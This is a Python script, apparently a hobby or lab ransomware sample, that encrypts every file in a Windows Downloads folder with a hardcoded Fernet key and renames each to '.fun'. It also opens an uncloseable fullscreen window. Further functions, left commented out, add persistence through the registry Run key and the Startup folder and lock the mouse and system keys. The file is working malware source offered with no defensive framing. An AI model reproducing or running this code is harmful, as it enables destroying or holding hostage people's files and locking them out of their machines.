import keyboard
import tkinter as tk
import threading
import mouse
import winreg
import shutil
from getpass import getuser
from pathlib import Path
from cryptography.fernet import Fernet
from typing import Final
import os


global executing
global filename
executing = True
filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
file_paths = []
path = "C:\\Users\\windows\\Downloads"
DIR_EXCLUSIONS: Final = ["backup"]
FILE_SUFFIX_EXCLUSIONS: Final = ["fun", "exe", "ini"]


def getDecryptedFiles():
    for root, dirs, files in os.walk("C:\\Users\\windows\\Downloads"):
        for file in files:
            if (not root.split("\\")[-1] in DIR_EXCLUSIONS):
                full_path = f"{root}\\{file}"
                if (not file.split(".")[-1] in FILE_SUFFIX_EXCLUSIONS):
                    file_paths.append(full_path)


def getEencryptedFiles():
    for root, dirs, files in os.walk("C:\\Users\\windows\\Downloads"):
        for file in files:
            if (not root.split("\\")[-1] in DIR_EXCLUSIONS):
                full_path = f"{root}\\{file}"
                if (file.__contains__(".fun")):
                    file_paths.append(full_path)

def encryptFiles():
    for file in file_paths:
        with open(file, "rb") as binary_file:
            content = binary_file.read()
        encrypted_content = Fernet(KEY).encrypt(content)
        with open(file, "wb") as binary_file:
            binary_file.write(encrypted_content)
        os.rename(file, f"{file}.fun")
    file_paths.clear()


def decryptFiles():
    for file in file_paths:
        with open(file, "rb") as binary_file:
            content = binary_file.read()
        decrypted_content = Fernet(KEY).decrypt(content)
        with open(file, "wb") as binary_file:
            binary_file.write(decrypted_content)
        os.rename(file, file.replace(".fun", ""))
    file_paths.clear()
    
def encryptionProcess():
    getDecryptedFiles()
    encryptFiles()
    
def decryptionProcess():
    getEencryptedFiles()
    decryptFiles()

def create_autostart_regedit():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "encryt_py", 0, winreg.REG_SZ,
                          f"{Path.cwd()}{filename}")
    except:
        print("error")


def create_autostart_dir():
    user = getuser()
    startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy(f"{Path.cwd()}{filename}", startup)
    except:
        print("error")


def disable_mouse():
    global executing
    while executing:
        mouse.move(1, 0, absolute=True, duration=0)


def block_keys():
    keyboard.block_key("linke windows")
    keyboard.block_key("rechte windows")
    keyboard.block_key("left windows")
    keyboard.block_key("right windows")
    keyboard.block_key("alt")
    keyboard.block_key("strg")
    keyboard.wait()


def on_closing():
    pass


# create_autostart_regedit()
# create_autostart_dir()

root = tk.Tk()
root.attributes("-fullscreen", True, "-topmost", True)

root.protocol("WM_DELETE_WINDOW", on_closing)

# threading.Thread(target=disable_mouse).start()
# threading.Thread(target=block_keys).start()

threading.Thread(target=encryptionProcess).start()
# threading.Thread(target=decryptionProcess).start()

root.mainloop()
